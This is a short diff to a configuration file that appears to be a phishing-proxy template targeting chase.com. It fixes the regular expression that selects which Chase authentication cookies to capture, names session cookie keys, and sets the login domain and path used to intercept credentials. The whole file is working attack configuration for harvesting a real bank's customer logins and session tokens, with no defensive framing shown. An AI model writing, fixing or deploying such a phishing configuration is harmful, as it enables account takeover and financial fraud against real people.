@@ -35,7 +35,7 @@ sub_filters:
 
 auth_tokens:
   - domain: '.chase.com'
-    keys: ['.*,regexp',']
+    keys: ['.*,regexp']
  # - domain: '.chase.com'
     keys: ['session','_visit','id']
  # - domain: 'auth.chase.com'
@@ -55,5 +55,5 @@ credentials:
     type: 'post'
 
 login:
-  domain: 'chase.com'
+  domain: 'www.chase.com'
   path: '/secure'
